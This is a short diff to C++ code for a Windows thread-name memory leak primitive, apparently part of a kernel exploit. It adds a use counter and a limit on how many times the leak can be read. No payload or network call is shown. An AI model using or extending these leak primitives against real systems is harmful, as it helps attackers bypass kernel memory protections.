@@ -22,6 +22,7 @@ ThreadNameManager::ThreadNameManager()
 {
 	leakThread = NULL;
 	nameSize = NULL;
+	leakUseCount = 0;
 
 	HMODULE ntDLL = GetModuleHandleA("ntdll.dll");
 
@@ -54,6 +55,7 @@ bool ThreadNameManager::GetDataLeak(UINT64 iChunkSize, UINT64 iLeakSize, UINT64 
 	}
 	nameSize = iChunkSize - offsetof(UNICODE_STRING, Buffer) - 0x20;
 	leakThread = NULL;
+	leakUseCount = 0;
 
 	leakSize = iLeakSize;
 
@@ -88,6 +90,7 @@ bool ThreadNameManager::GetDataLeak(UINT64 iChunkSize, UINT64 iLeakSize, UINT64 
 
 		if (leakThread)
 		{
+			leakUseCount = 0;
 			DEBUG_PRINT(" [*] ###### Found ThreadName Overwrite ######\n");
 			CleanExtraThreads();
 			return true;
@@ -183,6 +186,15 @@ std::vector<BYTE> ThreadNameManager::LeakData()
 		DEBUG_PRINT(" [!] Leak Thread has not yet been Located!\n");
 		return empty;
 	}
+	if (leakUseCount >= THREADNAME_MAX_USES_PER_LEAK) {
+		DEBUG_PRINT(
+			" [*] ThreadName leak use limit reached (%llu/%llu)\n",
+			(unsigned long long)leakUseCount,
+			(unsigned long long)THREADNAME_MAX_USES_PER_LEAK
+		);
+		return empty;
+	}
+	++leakUseCount;
     // _NtQueryInformationThread is expected to return leakSize bytes for the leak
 	// guard against absurd sizes
 	if (leakSize == 0 || leakSize > THREADNAME_MAX_LEAK) {
@@ -326,6 +338,8 @@ void ThreadNameManager::ClearThreads()
 		}
 		free(threads);
 		threads = NULL;
+		leakThread = NULL;
+		leakUseCount = 0;
         // reset the exit event so future threads will wait again
 		if (exitEvent) ResetEvent(exitEvent);
 	}
